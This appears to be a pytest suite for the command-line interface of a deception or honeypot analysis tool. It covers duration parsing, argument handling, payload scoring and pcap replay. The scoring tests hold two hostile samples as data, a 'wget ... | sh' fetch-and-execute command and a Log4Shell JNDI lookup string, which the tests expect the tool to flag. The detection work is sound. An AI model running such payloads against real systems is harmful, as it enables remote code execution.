"""Command line parsing and dispatch."""

from __future__ import annotations

from datetime import timedelta

import pytest

from deception_shield.cli import build_parser, main, parse_duration


class TestDurationParsing:
    @pytest.mark.parametrize(
        ("text", "expected"),
        [
            ("30s", timedelta(seconds=30)),
            ("15m", timedelta(minutes=15)),
            ("24h", timedelta(hours=24)),
            ("7d", timedelta(days=7)),
            ("2w", timedelta(weeks=2)),
            ("  12H  ", timedelta(hours=12)),
        ],
    )
    def test_valid_durations(self, text: str, expected: timedelta) -> None:
        assert parse_duration(text) == expected

    @pytest.mark.parametrize("text", ["", "h", "10", "10y", "abc", "-5m"])
    def test_invalid_durations_are_rejected(self, text: str) -> None:
        with pytest.raises(Exception):
            parse_duration(text)


class TestParser:
    def test_replay_requires_a_capture(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args(["replay"])

    def test_replay_accepts_several_captures(self) -> None:
        args = build_parser().parse_args(["replay", "a.pcap", "b.pcap"])
        assert args.capture == ["a.pcap", "b.pcap"]

    def test_analyze_is_an_alias_for_analyse(self) -> None:
        assert build_parser().parse_args(["analyze"]).command == "analyze"

    def test_format_defaults_to_markdown(self) -> None:
        assert build_parser().parse_args(["replay", "a.pcap"]).format == "markdown"

    def test_score_sources_are_mutually_exclusive(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args(["score", "--text", "x", "--file", "y"])

    def test_a_command_is_required(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args([])


class TestScoreCommand:
    def test_reports_a_malicious_payload(self, capsys) -> None:
        assert main(["score", "--text", "wget http://x/m.sh | sh"]) == 0
        out = capsys.readouterr().out
        assert "likely-malicious" in out
        assert "shell_pipe_execution" in out

    def test_reports_a_benign_payload(self, capsys) -> None:
        assert main(["score", "--text", "GET /index.html"]) == 0
        assert "benign" in capsys.readouterr().out

    def test_reads_a_file(self, tmp_path, capsys) -> None:
        target = tmp_path / "payload.bin"
        target.write_bytes(b"${jndi:ldap://x/y}")
        assert main(["score", "--file", str(target)]) == 0
        assert "log4shell" in capsys.readouterr().out


class TestReplayCommand:
    def test_missing_capture_exits_nonzero(self, capsys) -> None:
        assert main(["replay", "/nonexistent/x.pcap"]) == 2
        assert "no such capture" in capsys.readouterr().err

    def test_empty_directory_exits_nonzero(self, tmp_path, capsys) -> None:
        assert main(["replay", str(tmp_path)]) == 2
        assert "no captures matched" in capsys.readouterr().err
